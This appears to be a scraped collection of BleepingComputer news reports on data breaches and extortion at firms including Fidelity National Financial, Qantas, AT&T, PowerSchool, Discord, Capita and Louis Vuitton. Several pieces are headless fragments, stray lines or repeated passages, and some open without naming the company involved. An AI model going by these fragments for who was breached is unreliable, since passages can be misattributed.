Fidelity National Financial: Hackers stole data of 1.3 million people,https://www.bleepingcomputer.com/news/security/fidelity-national-financial-hackers-stole-data-of-13-million-people/,Bill Toulas,"January 10, 2024","Fidelity National Financial (FNF) has confirmed that a November cyberattack (claimed by the BlackCat ransomware gang) has exposed the data of 1.3 million customers. FNF is an American title insurance and transaction services provider for the real estate and mortgage industries. It is one of the largest companies of this kind in the United States, with an annual revenue of more than $10 billion, a market capitalization of $13.3 billion, and an employee force of over 23,000 people. In mid-December, the firm warned that it had suffered a cyberattack after the threat actors accessed the network using stolen credentials. FNF's announcement from the time explained that containment measures forced it to take certain IT systems offline, disrupting business services. Yesterday, Fidelity National Financial confirmed in an amended SEC Form 8-K filing that the cyberattack occurred on November 19, 2023, and was successfully contained seven days later. According to the filing, the attackers used a non-propagating malware that could exfiltrate data from the breached systems. The investigation that followed to appreciate the impact of the incident was concluded on December 13, 2023, revealing that the intruders had stolen the data of 1.3 million customers. ""We determined that an unauthorized third-party accessed certain FNF systems, deployed a type of malware that is not self-propagating, and exfiltrated certain data,"" reads FNF's SEC filing . ""The Company has notified its affected customers and applicable state attorneys general and regulators, and approximately 1.3 million potentially impacted consumers; is providing credit monitoring, web monitoring, and identity theft restoration services; and is fielding questions from consumers."" The filing clarifies that the breach was contained on FNF systems, and the attack has not extended to any of the connected customer-owned systems. FNF concludes by saying that it does not believe the incident will have any material impact on its financial status and operations and pledges to ""vigorously defend itself"" against class action lawsuits targeting it for this data breach. While not mentioned by Fidelity National Financial, the BlackCat (ALPHV) ransomware gang previously claimed responsibility for the attack by listing the company on their data leak site. The threat actors did not say whether data was stolen in the attack, stating they were waiting for FNF to contact them first. The Fidelity National Financial breach is one of the many attacks that have recently targeted the mortgage and housing industry since late November, including First American , loanDepot , and Mr. Cooper . Of those, only loanDepot clarified that they suffered a ransomware attack, while all other firms have not shared any details about the nature of the incident.

The company states that it was one of hundreds of companies affected by a supply-chain attack disclosed last week , in which threat actors abused the stolen authentication tokens to exfiltrate data. BleepingComputer learned of the breach this weekend from Palo Alto Networks' customers, who expressed concern that the breach exposed sensitive information, such as IT information and passwords, shared in support cases. Palo Alto Networks later confirmed to BleepingComputer that the incident was limited to its Salesforce CRM and did not affect any products, systems, or services. ""Palo Alto Networks confirms that it was one of hundreds of customers impacted by the widespread supply chain attack targeting the Salesloft Drift application that exposed Salesforce data,"" Palo Alto Networks told BleepingComputer. ""We quickly contained the incident and disabled the application from our Salesforce environment. Our Unit 42 investigation confirms that this situation did not affect any Palo Alto Networks products, systems, or services."" ""The attacker extracted primarily business contact and related account information, along with internal sales account records and basic case data. We are in the process of directly notifying any impacted customers."" Palo Alto Networks told BleepingComputer that the exfiltrated support case data only contained contact info and text comments, and not technical support files or attachments. The campaign, first tracked by Google's Threat Intelligence team as UNC6395 , specifically targeted support cases to identify sensitive data, such as authentication tokens, passwords, and cloud secrets, that could be used to pivot into other cloud services and steal data. ""Our observations indicate that the threat actor performed mass exfiltration of sensitive data from various Salesforce objects, including Account, Contact, Case and Opportunity records,"" Palo Alto Networks warned in a threat brief shared with BleepingComputer. ""Following exfiltration, the actor appeared to be actively scanning the acquired data for credentials, likely with the intent to facilitate further attacks or expand their access. We have observed that the threat actor deleted queries to hide evidence of the jobs they run, likely as an anti-forensics technique. Palo Alto Networks reports that the attackers were searching for secrets, including AWS access keys (AKIA), Snowflake tokens, VPN and SSO login strings, and generic keywords such as ""password,"" ""secret,"" or ""key."" These credentials could then be used to breach additional cloud platforms to steal data for extortion attacks. Google and Palo Alto Networks say that the threat actors used automated tools to steal data, with user-agent strings indicating that custom Python tools were used: As part of these attacks, the threat actors mass-exfiltrated data from the Account, Contact, Case and Opportunity Salesforce objects. To evade detection, the threat actors deleted logs and used Tor to obfuscate their origin. Palo Alto Networks states that it has revoked the associated tokens, and rotated the credentials following the incident. The company recommends Salesloft Drift customers treat the incident with ""immediate urgency"" and perform the following actions: Palto Alto Networks, Salesforce, and Google have now disabled Drift integrations while the investigation into how the OAuth tokens were stolen continues. The supply chain attack has impacted other companies, including Zscaler and Google . Since the beginning of the year, Salesforce has been the target of data theft attacks conducted by members associated with the ShinyHunters extortion group. In past attacks, the threat actors conducted voice phishing (vishing) to trick employees into linking a malicious OAuth app with their company's Salesforce instances. Once linked, the threat actors used the connection to download and steal the databases, which were then used to extort the company through email. However, with the Salesloft breach, the threat actors were able to steal data using the stolen OAuth tokens.

Even though the exact number of students affected by this breach wasn't shared, based on current student enrollment numbers, the attackers gained access to sensitive data belonging to roughly 1,150 students, according to the school district's estimations. Furthermore, the Maryland Office of the Attorney General confirmed to The Baltimore Sun that the breach impacts over 31,000 individuals. During the breach, the threat actors may have stolen folders, files, or records containing social security numbers, driver's license numbers, or passport numbers belonging to current and former employees, volunteers, and contractors. Files exposed during the incident may also have contained a combination of student data, call logs, absenteeism records, or the maternity status of currently enrolled students. While the school district didn't link the attack to a specific threat group or cybercrime operation, a WBALTV report linked it to Cloak ransomware.

Qantas confirms data breach impacts 5.7 million customers,https://www.bleepingcomputer.com/news/security/qantas-confirms-data-breach-impacts-57-million-customers/,Lawrence Abrams,"July 9, 2025","Australian airline Qantas has confirmed that 5.7 million people have been impacted by a recent data breach, in which threat actors stole customers' data. On July 1st, Qantas disclosed that it had detected a cyberattack the previous day on a third-party platform used by a Qantas airline contact centre. While the company did not share any further details, BleepingComputer learned that the attack shared similarities with other attacks on the aviation industry linked to threat actors classified as Scattered Spider. On Monday, Qantas warned that the threat actors had contacted them , likely to begin extorting the company to prevent the release of the stolen data. In a new update today , Qantas has confirmed that the threat actors stole data for approximately 5.7 million customers, with varying types of data exposed in the breach: Qantas warns that these counts are based on unique email addresses, and customers may have multiple accounts with different emails. The airline also continues to stress that no Qantas Frequent Flyer accounts, passwords, PINs and login details, financial information, or passport details were stolen in the attack. Qantas says they are now contacting customers whose data was stolen and have implemented additional safeguards to protect customers' data. ""Our absolute focus since the incident has been to understand what data has been compromised for each of the 5.7 million impacted customers and to share this with them as soon as possible,"" said Qantas Group Chief Executive Officer Vanessa Hudson. ""From today we are reaching out to customers to notify them of the specific personal data fields that were held in the compromised system and offer advice on how they can access the necessary support services."" ""Since the incident, we have put in place a number of additional cyber security measures to further protect our customers data, and are continuing to review what happened."" Qantas recommends that customers be on the lookout for emails claiming to be from Qantas that may be attempts to steal further information. The attack on Qantas follows other recent attacks on the aviation industry, including those on Hawaiian Airlines and WestJet . The threat actors, classified as Scattered Spider , are utilizing social engineering attacks to breach corporate networks and systems, stealing data and attempting to extort companies into paying a ransom. In some attacks, such as M&S and Co-op , the threat actors attempted to deploy the DragonForce ransomware to encrypt devices.

AT&T confirms data for 73 million customers leaked on hacker forum,https://www.bleepingcomputer.com/news/security/atandt-confirms-data-for-73-million-customers-leaked-on-hacker-forum/#comments,Lawrence Abrams,"March 30, 2024","AT&T has finally confirmed it is impacted by a data breach affecting 73 million current and former customers after initially denying the leaked data originated from them. This comes after AT&T has repeatedly denied for the past two weeks that a massive trove of leaked customer data originated from them and or that their systems had been breached. While the company continues to say there is no indication their systems were breached, it has now confirmed that the leaked data belongs to 73 million current and former customers. ""Based on our preliminary analysis, the data set appears to be from 2019 or earlier, impacting approximately 7.6 million current AT&T account holders and approximately 65.4 million former account holders,"" AT&T said in a statement shared with BleepingComputer. The company further says that the security passcodes used to secure accounts were also leaked for 7.6 million customers. In 2021, a threat actor known as Shiny Hunters claimed to be selling the stolen data of 73 million AT&T customers. This data includes names, addresses, phone numbers, and, for many customers, social security numbers and birth dates. At the time, AT&T denied that they suffered a breach or that the data originated from them. Fast forward to 2024, and another threat actor leaked the massive dataset on a hacking forum, stating it was the same data stolen by Shiny Hunters. BleepingComputer analyzed the data and determined that it contained the same sensitive information that ShinyHunters claimed was stolen. However, not every customer had their social security number or birth date exposed by the incident. AT&T once again denied that they suffered a breach or that the data originated from them. However, BleepingComputer has spoken to over 50 AT&T and DirectTV customers since the data was leaked, and they told us that the leaked data contains information that was only used for their AT&T accounts. These customers stated that they used the disposable email feature of Gmail and Yahoo to create DirectTV or AT&T-specific email addresses that were only used when they signed up for their service. These email addresses were confirmed not to be used on any other platform, indicating that the data had to have originated from DirectTV or AT&T. Troy Hunt also confirmed similar information from customers after the data was added to the Have I Been Pwned data breach notification service. However, after contacting AT&T numerous times with this information, the company has not responded to further emails until today. DirectTV ultimately told BleepingComputer that we would need to contact AT&T with further questions as the data predates their spinoff, and they no longer have access to AT&T systems to confirm. Today, AT&T told BleepingComputer that they would only share further information about the breach in their published statement and a new page on keeping AT&T accounts secure. The page on keeping accounts secure further discloses that the passcodes for 7.6 million AT&T customers were compromised as part of the breach and have been reset by the company. Customers use passcodes to further secure their AT&T accounts by requiring them to receive customer support, manage accounts at retail stores, or sign into their online accounts. ""It has come to our attention that a number of AT&T passcodes have been compromised,"" reads the new AT&T advisory . ""We are reaching out to all 7.6M impacted customers and have reset their passcodes. In addition, we will be communicating with current and former account holders with compromised sensitive personal information."" TechCrunch first reported on the compromised passcodes after being contacted by a researcher who said the leaked data contained encrypted passcodes for millions of users. AT&T further says that the data appears to be from 2019 and earlier and does not contain personal financial information or call history. The company will notify all 73 million former and current customers about the breach and the next steps they should take.

PowerSchool is a cloud-based K-12 software provider serving over 60 million students and 18,000 customers worldwide, offering enrollment, communication, attendance, staff management, learning, analytics, and finance solutions. In December, the company announced that hackers had gained unauthorized access to its customer support portal, named PowerSource. This portal included a remote maintenance tool that allowed the threat actor to connect to customers' databases and steal sensitive information, including full names, physical addresses, contact information, Social Security numbers (SSNs), medical data, and grades. Although the company has not officially disclosed the number of people impacted by this incident, BleepingComputer first reported that the threat actor claimed to have stolen the data of 72 million people, including students and teachers. In an update published late last week, PowerSchool shared a CrowdStrike incident report that was compiled on February 28, 2025. In that report, CrowdStrike confirms that the threat actors breached PowerSchool through PowerSource using compromised credentials and maintained their access between December 19, 2024, 19:43:14 UTC, and December 28, 2024, 06:31:18 UTC. The cybersecurity firm also confirmed that the threat actor exfiltrated teachers' and students' data from the compromised systems, though it notes there's no evidence that other databases were stolen. Similarly, there's no evidence that malware was planted on PowerSchool systems or that the threat actor escalated their privilege, moved laterally, or downstream to customer/school systems. CrowdStrike noted that, as of January 2, 2025, its dark web intelligence showed that the threat actors kept their promise not to publish data after an extortion demand was paid, as the cybersecurity firm has not found the data offered for sale or leaked online. CrowdStrike also found that threat actors breached PowerSource even earlier than December, with the same compromised credentials used months earlier, in August and September 2024. However, there is not enough data to confirm if it was the same threat actor behind all of the breaches. ""Beginning on August 16, 2024, at 01:27:29 UTC, PowerSource logs showed that an unknown actor successfully accessed the PowerSchool PowerSource portal using the compromised support credentials,"" explains CrowdStrike . ""CrowdStrike did not find sufficient evidence to attribute this activity to the Threat Actor responsible for the activity in December 2024.""

At this time, PowerSchool has still not officially shared the total number of impacted schools, students, or teachers, raising concerns about transparency.

Discord discloses data breach after hackers steal support tickets,https://www.bleepingcomputer.com/news/security/discord-discloses-data-breach-after-hackers-steal-support-tickets/,Ionut Ilascu,"October 4, 2025","Hackers stole partial payment information and personally identifiable data, including names and government-issued IDs, from some Discord users after compromising a third-party customer service provider. The attack occurred on September 20 and affected “a limited number of users” who interacted with Discord’s customer support and/or Trust and Safety teams. Discord was created as a communication platform for gamers, who represent more than 90% of the userbase, but expanded to various other communities, allowing text messages, voice chats, and video calls. According to the platform’s statistics, more than 200 million people are using Discord every month. In the notification to affected users, the messaging company says that the attack occurred on September 20 and “an unauthorized party gained limited access to a third-party customer service system used by Discord.” On Friday, Discord disclosed the incident publicly, saying that it took immediate action to isolate the support provider from its ticketing system and started an investigation. This included revoking the customer support provider’s access to our ticketing system, launching an internal investigation, engaging a leading computer forensics firm to support our investigation and remediation efforts, and engaging law enforcement - Discord The attack appears to be financially motivated, as the hackers demanded a ransom from Discord in exchange for not leaking the stolen information. Exposed data includes personally identifying information such as real names and usernames, email addresses, and other contact details provided to the support team. The social communication service says IP addresses, messages and attachments sent to customer service agents were also compromised. The hackers also accessed photos of government-issued identification documents (driver’s license, passport) for a small number of users. Partial billing info, like payment type, the last four credit card digits, and purchase history associated with the compromised account, were exposed as well. VX-Underground security group notes that the type of data stolen from Discord users represents “literally peoples [sic] entire identity.” Alon Gal, Chief Technology Officer at threat intelligence company Hudson Rock, believes that if the hackers release the Discord data, it could provide crucial information to help uncover or solve crypto hacks and scams. “I’ll just say that if it leaks, this db is going to be huge for solving crypto related hacks and scams because scammers don’t often remember using a burner email and VPN and almost all of them are on Discord,” says Alon Gal , Chief Technology Officer at Hudson Rock Currently, it is unclear how many Discord users are affected, and the name of the third-party provider or the access vector has not been disclosed publicly. However, the Scattered Lapsus$ Hunters (SLH) threat group claimed the attack earlier today. An image the hackers posted online shows a Kolide access control list for Discord employees with access to the admin console. Kolide is a device trust solution that connects to Okta cloud-based Identity and Access Management (IAM) service for multi-factor authentication. SLH confirmed to BleepingComputer that it was a Zendesk breach that allowed stealing the Discord user data. Update: While SLH initially appeared to confirm to BleepingComputer that they were behind the Discord Zendesk compromise, they later stated that it was a different group that they know and interact with. BleepingComputer contacted Discord with a request for more details about the attack, but a comment from the social communications platform was not immediately available. In a statement Zendesk sent to BleepingComputer, the company says that the incident did not occur because of a vulnerability within their platform. ""Our investigation indicates this incident did not arise from a vulnerability within Zendesk's platform. Zendesk’s own systems were not compromised,"" a company representative said. It is worth noting that hundreds of companies had their Salesforce instances compromised after the ShinyHunters extortion group accessed them using stolen Salesloft Drift OAuth tokens. Last month, the hackers claimed to have stolen more than 1.5 billion Salesforce records from 760 companies. More recently, ShinyHunters launched a data leak site listing more than three dozen victims. Update [October 9, 12:36 ET] : We added the statement from Zendesk we received on October 9.

Discord discloses data breach after hackers steal support tickets,https://www.bleepingcomputer.com/news/security/discord-discloses-data-breach-after-hackers-steal-support-tickets/#comments,Ionut Ilascu,"October 4, 2025","Hackers stole partial payment information and personally identifiable data, including names and government-issued IDs, from some Discord users after compromising a third-party customer service provider. The attack occurred on September 20 and affected “a limited number of users” who interacted with Discord’s customer support and/or Trust and Safety teams. Discord was created as a communication platform for gamers, who represent more than 90% of the userbase, but expanded to various other communities, allowing text messages, voice chats, and video calls. According to the platform’s statistics, more than 200 million people are using Discord every month. In the notification to affected users, the messaging company says that the attack occurred on September 20 and “an unauthorized party gained limited access to a third-party customer service system used by Discord.” On Friday, Discord disclosed the incident publicly, saying that it took immediate action to isolate the support provider from its ticketing system and started an investigation. This included revoking the customer support provider’s access to our ticketing system, launching an internal investigation, engaging a leading computer forensics firm to support our investigation and remediation efforts, and engaging law enforcement - Discord The attack appears to be financially motivated, as the hackers demanded a ransom from Discord in exchange for not leaking the stolen information. Exposed data includes personally identifying information such as real names and usernames, email addresses, and other contact details provided to the support team. The social communication service says IP addresses, messages and attachments sent to customer service agents were also compromised. The hackers also accessed photos of government-issued identification documents (driver’s license, passport) for a small number of users. Partial billing info, like payment type, the last four credit card digits, and purchase history associated with the compromised account, were exposed as well. VX-Underground security group notes that the type of data stolen from Discord users represents “literally peoples [sic] entire identity.” Alon Gal, Chief Technology Officer at threat intelligence company Hudson Rock, believes that if the hackers release the Discord data, it could provide crucial information to help uncover or solve crypto hacks and scams. “I’ll just say that if it leaks, this db is going to be huge for solving crypto related hacks and scams because scammers don’t often remember using a burner email and VPN and almost all of them are on Discord,” says Alon Gal , Chief Technology Officer at Hudson Rock Currently, it is unclear how many Discord users are affected, and the name of the third-party provider or the access vector has not been disclosed publicly. However, the Scattered Lapsus$ Hunters (SLH) threat group claimed the attack earlier today. An image the hackers posted online shows a Kolide access control list for Discord employees with access to the admin console. Kolide is a device trust solution that connects to Okta cloud-based Identity and Access Management (IAM) service for multi-factor authentication. SLH confirmed to BleepingComputer that it was a Zendesk breach that allowed stealing the Discord user data. Update: While SLH initially appeared to confirm to BleepingComputer that they were behind the Discord Zendesk compromise, they later stated that it was a different group that they know and interact with. BleepingComputer contacted Discord with a request for more details about the attack, but a comment from the social communications platform was not immediately available. In a statement Zendesk sent to BleepingComputer, the company says that the incident did not occur because of a vulnerability within their platform. ""Our investigation indicates this incident did not arise from a vulnerability within Zendesk's platform. Zendesk’s own systems were not compromised,"" a company representative said. It is worth noting that hundreds of companies had their Salesforce instances compromised after the ShinyHunters extortion group accessed them using stolen Salesloft Drift OAuth tokens. Last month, the hackers claimed to have stolen more than 1.5 billion Salesforce records from 760 companies. More recently, ShinyHunters launched a data leak site listing more than three dozen victims. Update [October 9, 12:36 ET] : We added the statement from Zendesk we received on October 9.

""We are working to mitigate risk to our users and the Company, and have notified and are cooperating with law enforcement.

While the breach has allegedly exposed the data of over 560 million Ticketmaster users , the company states that they do not believe that the breach will have a material impact on the overall business operations or its financial condition. This admission comes after a threat actor known as Shiny Hunters has been attempting to sell the Ticketmaster data on a hacking forum for $500,000. The allegedly stolen databases supposedly contain 1.3TB of data, including customers' full details (i.e., names, home and email addresses, and phone numbers), as well as ticket sales, order, and event information for 560 million customers. In a conversation with the threat actor, ShinyHunters told BleepingComputer that there were interested buyers in the data. They believed that one of the buyers that approached them was Ticketmaster themselves. When asked how they stole the data, the threat actor said they ""can't say anything about this."" However, today, more information was revealed on how the threat actors gained access to the Ticketmaster database and possibly the data of many other customers. Alon Gal of Hudson Rock spoke to one of the threat actors behind the attack, who claimed they were responsible for recent Santander and Ticketmaster data breaches and said they stole the data from cloud storage company Snowflake . According to the threat actor, they used credentials stolen using information-stealing malware to breach a Snowflake employee's ServiceNow account, which they used to exfiltrate information from the company. This information included unexpired auth tokens that could be used to create session tokens and access customer accounts to download data. The threat actor claims that they used this method to steal data from other companies, including Anheuser-Busch, State Farm, Mitsubishi, Progressive, Neiman Marcus, Allstate, and Advance Auto Parts. Progressive and Mistubishi disputed the threat actor's claims, telling BleepingComputer that there is no indication of any breach of their systems or data. Snowflake says the recent breaches were caused by poorly secured customer accounts whose credentials were stolen and did not have multi-factor authentication enabled. The company added that the attacks began in mid-April, with customers' data first being stolen on May 23. Snowflake has shared IOCs from the attacks so that customers can query logs to determine if they were breached. Mandiant Consulting CTO Charles Carmakal told BleepingComputer that Mandiant has been investigating compromised Snowflake clients over the past few weeks and believes their Snowflake tenants were breached using stolen credentials. When we contacted Snowflake to confirm the threat actor’s claims that they hacked an employee's account, instead of disputing them, they said they had nothing further to share.

The entire voter roll that may have been exposed contains a wide range of personally identifiable information (PII), including driver's license numbers, dates of birth, partial social security numbers, and contact information such as phone numbers and email addresses. ""Today, DCBOE learned the full voter roll MAY have been accessed in the breach of DataNet Systems' database server,"" the agency tweeted . ""DataNet Systems could not pinpoint if or when this file may have been accessed or how many, if any, voter records were accessed,"" DCBOE said in a Friday update. ""Out of an abundance of caution, DCBOE will reach out to all registered voters. In addition, DCBOE will be engaging with Mandiant, a cybersecurity consulting firm, to assist with next steps."" On October 5, 2023, the DCBOE became aware of a breach involving a threat actor known as RansomVC, which claimed to have stolen 600,000 lines of U.S. voter data, including D.C. voter records. In collaboration with MS-ISAC's Computer Incident Response Team (CIRT), the agency took down its website upon discovering the attack. They replaced it with a maintenance page to contain the situation after identifying the website as the source of the breach. Further investigations revealed the attackers gained access to the information through the web server of DataNet, the hosting provider for Washington D.C.'s election authority. No DCBOE databases or servers were directly compromised in the incident. The DCBOE is investigating the breach with the assistance of external security experts, the Federal Bureau of Investigation (FBI), and the Department of Homeland Security (DHS). The efforts are focused on assessing the full extent of the breach, identifying the vulnerabilities exploited during the attack, and implementing measures to safeguard voter data and systems.

D.C.

The entire voter roll that may have been exposed contains a wide range of personally identifiable information (PII), including driver's license numbers, dates of birth, partial social security numbers, and contact information such as phone numbers and email addresses. ""Today, DCBOE learned the full voter roll MAY have been accessed in the breach of DataNet Systems' database server,"" the agency tweeted . ""DataNet Systems could not pinpoint if or when this file may have been accessed or how many, if any, voter records were accessed,"" DCBOE said in a Friday update. ""Out of an abundance of caution, DCBOE will reach out to all registered voters. In addition, DCBOE will be engaging with Mandiant, a cybersecurity consulting firm, to assist with next steps."" On October 5, 2023, the DCBOE became aware of a breach involving a threat actor known as RansomVC, which claimed to have stolen 600,000 lines of U.S. voter data, including D.C. voter records. In collaboration with MS-ISAC's Computer Incident Response Team (CIRT), the agency took down its website upon discovering the attack. They replaced it with a maintenance page to contain the situation after identifying the website as the source of the breach. Further investigations revealed the attackers gained access to the information through the web server of DataNet, the hosting provider for Washington D.C.'s election authority. No DCBOE databases or servers were directly compromised in the incident. The DCBOE is investigating the breach with the assistance of external security experts, the Federal Bureau of Investigation (FBI), and the Department of Homeland Security (DHS). The efforts are focused on assessing the full extent of the breach, identifying the vulnerabilities exploited during the attack, and implementing measures to safeguard voter data and systems. On their dark web website, RansomedVC claims the recent security breach led to the theft of more than 600,000 lines of voter data from the United States.

The company was spun off from Xerox in 2017 and currently employs 56,000 people across 22 countries, having an annual revenue of $3.4 billion.

Capita to pay £14 million for data breach impacting 6.6 million people,https://www.bleepingcomputer.com/news/security/capita-to-pay-14-million-for-data-breach-impacting-66-million-people/#comment_form,Bill Toulas,"October 15, 2025","The Information Commissioner’s Office (ICO) in the UK has fined Capita, a provider of data-driven business process services, £14 million ($18.7 million) for a data breach incident in 2023 that exposed the personal information of 6.6 million people. Capita is a major UK-based outsourcing and professional services company that provides consulting, digital, and software services to local councils, the NHS, the Ministry of Defense, and organizations in the banking, utilities, and telecommunications sectors. With around 34,000 employees and an annual revenue of £3 billion, Capita's clients are mostly in the UK and Europe. The ICO had initially set the fine to a much larger £45 million, but the agency decided to reduce the penalty after the company accepted liability, implemented important security improvements, and offered data protection services to exposed individuals. The data protection authority fined Capita plc £8 million and Capita Pension Solutions Limited received a penalty of £6 million. The ICO’s investigation has now confirmed that the stolen data impacts 6.6 million people, and hundreds of Capita clients, including 325 pension scheme providers in the UK. In April 2023, the company announced that it had been targeted by hackers who attempted access to its internal Microsoft 365 environment, forcing some systems offline as part of its response. An update three weeks later confirmed that hackers had accessed 4% of Capita’s internal IT infrastructure, and exfiltrated private files hosted on the breached systems. The Black Basta ransomware gang claimed the attack and threatened to leak all stolen files unless the company paid a ransom. The cyberattack occurred on March 22, 2023, when a Capita employee downloaded a malicious file that gave hackers access to the company's internal network. The ICO comments that, even though the breach was detected within 10 minutes, Capita failed to isolate the infected device for another 58 hours, giving the attackers ample time to move laterally, spread on the network, and access sensitive databases. “This file enabled the deployment of malicious software onto the Capita network, allowing the hacker to stay in the system, gain administrator permissions and access other areas of the network,” Information Commissioner's Office “Between 29 and 30 March 2023, nearly one terabyte of data was exfiltrated. On 31 March 2023, ransomware was deployed onto Capita systems and the hacker reset all user passwords, preventing Capita staff from accessing their systems and network,” states UK's data protection authority. Capita is now fined for poor access controls (absence of tiered admin account model), delayed response to security alerts, operating an understaffed Security Ops Center, and failing to perform regular penetration testing and risk management exercises. Capita's CEO Adolfo Hernandez announced the settlement with ICO, underlining the effort and investment that has gone into strengthening the firm's cybersecurity stance since the incident. The executive also noted that they do not expect the payment of the fine to have an impact on previously published investor guidance. It's budget season!

The union represents over 178,000 education professionals, including teachers, support staff, higher education personnel, nurses, retired educators, and future teachers. ""PSEA experienced a security incident on or about July 6, 2024 that impacted our network environment,"" the organization said in breach notification letters sent to 517,487 individuals . ""Through a thorough investigation and extensive review of impacted data which was completed on February 18, 2025, we determined that the data acquired by the unauthorized actor contained some personal information belonging to individuals whose information was contained within certain files within our network."" PSEA says the stolen information varies by individual and consists of personal, financial, and health data, including driver's license or state IDs, social security numbers, account PINs, security codes, payment card information, passport information, taxpayer ID numbers, credentials, health insurance and medical information. The union offers free IDX credit monitoring and identity restoration services to individuals whose Social Security numbers were affected if they enroll by June 17, 2025. It also advised those affected to monitor their financial account statements and credit reports for suspicious activity, obtain a free credit report, and place a fraud alert and/or a security freeze on their credit files. While PSEA didn't attribute the attack to a specific threat actor, the Rhysida ransomware gang claimed the breach on September 9, 2024. The cybercrime group demanded a 20 BTC ransom, threatening to leak the stolen data if the ransom demand was not paid. While PSEA didn't share if it paid to prevent the data leak, the ransomware gang has removed the entry from their dark web leak site. ​The Rhysida ransomware-as-a-service (RaaS) operation surfaced almost two years ago, in May 2023, and gained notoriety after breaching the British Library and the Chilean Army (Ejército de Chile) . The gang hacked Sony subsidiary Insomniac Games in November 2023 and leaked 1,67 TB of documents after the game studio refused to pay a $2 million ransom. Rhysida ransomware affiliates also claimed a cyberattack on Lurie Children's Hospital in Chicago in February 2024, a leading U.S. pediatric acute care institution that provides care to over 200,000 children annually, offering to sell the stolen data for 60 BTC (roughly $3,700,000 at the time). More recently, the Singing River Health System warned that nearly 900,000 people's data was stolen in an August 2023 ransomware attack, and the City of Columbus, Ohio, notified 500,000 individuals of a data breach after a July 2024 Rhysida breach. CISA and the FBI warned that Rhysida affiliates are behind many opportunistic attacks targeting organizations across a wide range of industry sectors, while the U.S. Department of Health and Human Services (HHS) has linked Rhysida to attacks targeting healthcare organizations.

Luxury fashion giant Louis Vuitton confirmed that breaches impacting customers in the UK, South Korea, and Turkey stem from the same security incident, which is believed to be linked to the ShinyHunters extortion group. Since last week, the retailer has been notifying customers that their info was exposed in a data breach, first in South Korea, then in Turkey, and on Friday in the United Kingdom. After publishing, BleepingComputer learned that notifications also went to customers in Italy and Sweden. ""Despite all security measures in place, on July 2, 2025, we became aware of a personal data breach resulting from the exfiltration of certain personal data of some of our clients following an unauthorized access to our system,"" reads Louis Vuitton's data breach notifications sent to customers. ""We would like to assure you that our cybersecurity teams have taken care of the incident with the utmost diligence and attention. Technical measures were immediately taken to contain the incident after its occurence, notably by blocking the unauthorized access. ""Louis Vuitton teams are mobilized to cooperate with the competent authorities which have been notified, including the Information Commissioner's Office (the ICO)."" In a statement to BleepingComputer, Louis Vuitton confirmed that no payment information was compromised from the database accessed during the incident. The company further stated that it is working with cybersecurity experts to investigate the incident and has begun notifying relevant regulators. When asked if the breach notifications in the different regions are linked to the same security incident, BleepingComputer was told that their statement applies to all notifications sent to clients. This incident follows similar breaches disclosed by Tiffany & Co. in April and House of Dior in May , affecting customers in South Korea. When BleepingComputer asked if the Louis Vuitton and Dior breaches were part of the same cyberattack, a LVMH spokesperson said there was no additional information they could share at this time. However, sources have told BleepingComputer that the LVMH breaches are linked to an attack by the ShinyHunters extortion group, which gained access and stole data from a third-party vendor's database. This same attack is also believed to be tied to a data breach at Adidas disclosed in May that also impacted customers from South Korea and Turkey. ShinyHunters is a prolific threat actor tied to numerous data theft campaigns, including those against Salesforce and PowerSchool , as well as the SnowFlake attacks , which impacted Santander , Ticketmaster , AT&T , Advance Auto Parts , Neiman Marcus , and Cylance . Last month, French police arrested five operators of the BreachForum cybercrime forum, which included ShinyHunters members, who had helped re-launch the hacking forum. However, it is believed that other members of the group are still at large, so other attacks may appear under that alias in the future.

When asked if the breach notifications in the different regions are linked to the same security incident, BleepingComputer was told that their statement applies to all notifications sent to clients. This incident follows similar breaches disclosed by Tiffany & Co. in April and House of Dior in May , affecting customers in South Korea. When BleepingComputer asked if the Louis Vuitton and Dior breaches were part of the same cyberattack, a LVMH spokesperson said there was no additional information they could share at this time. However, sources have told BleepingComputer that the LVMH breaches are linked to an attack by the ShinyHunters extortion group, which gained access and stole data from a third-party vendor's database. This same attack is also believed to be tied to a data breach at Adidas disclosed in May that also impacted customers from South Korea and Turkey. ShinyHunters is a prolific threat actor tied to numerous data theft campaigns, including those against Salesforce and PowerSchool , as well as the SnowFlake attacks , which impacted Santander , Ticketmaster , AT&T , Advance Auto Parts , Neiman Marcus , and Cylance . Last month, French police arrested five operators of the BreachForum cybercrime forum, which included ShinyHunters members, who had helped re-launch the hacking forum. However, it is believed that other members of the group are still at large, so other attacks may appear under that alias in the future. BleepingComputer contacted Louis Vuitton to ask if ShinyHunters was behind its breach but did not receive a response at this time.

The leak was announced on Sunday by threat actor 'EnergyWeaponUser,' also implicating the hacker 'IntelBroker,' who supposedly took part in the November 2024 breach. The threat actors leaked on BreachForums 44,000 Ford customer records containing customer information, including full names, physical locations, purchase details, dealer information, and record timestamps. The exposed records aren't extremely sensitive, but they still contain personally identifiable information that could empower phishing and social engineering attacks targeting the exposed individuals. The threat actors did not attempt to sell the dataset but instead offered it to registered members of the hacker forum for eight credits, equal to a little over $2. BleepingComputer contacted Ford to validate the claims, and a spokesperson for the firm told us they are investigating the allegations. ""Ford is aware and is actively investigating the allegations that there has been a breach of Ford data. Our investigation is active and ongoing,"" Ford told BleepingComputer. The involvement of IntelBroker in the breach lends some credibility to the threat actor's allegations based on the threat actor's recent record. The hacker has recently achieved confirmed breaches at Cisco's DevHub portal , Nokia (through a third party) , Europol's EPE web portal , and T-Mobile (via a vendor) .

KAVX is an American manufacturer of advanced electronic components, a subsidiary of the Japanese semiconductor giant Kyocera. It employs over ten thousand specialists and has an annual revenue of $1.3 billion. In the data breach notification to affected people, KAVX says that it discovered on October 10, 2023 that hackers accessed its systems between February16, and March 30, 2023. “On March 30, 2023, KAVX experienced a cybersecurity incident affecting servers located in Greenville and Myrtle Beach, South Carolina, USA, which resulted in the encryption of a limited number of systems and temporary disruption of certain services,” reads the notice . “KAVX later discovered that the data contained on the impacted servers included personal information of individuals globally,” the company notes. Following an internal investigation to determine what information was exposed, KAVX confirms that it includes at least full names and Social Security Numbers (SSNs). Possibly, more details were exposed, but the relevant section on the notice sample is censored. KAVX says it has no evidence that the cyber-criminals abused the stolen data but reminds the letter recipients of the associated risk of identity theft and fraud, urging them to be cautious. In response to the situation, the company will also cover the costs for a 12-month dark web monitoring and password leak service for all impacted individuals. The LockBit ransomware gang claimed to have compromised KAVX on May 26, 2023, when it added the firm to its data leak site. The threat actors published several samples of the stolen data on their extortion portal, including passport scans, financial documents, non-disclosure agreements, and more. The deadline that the hackers had set for KAVX to pay the ransom was June 9, 2023.

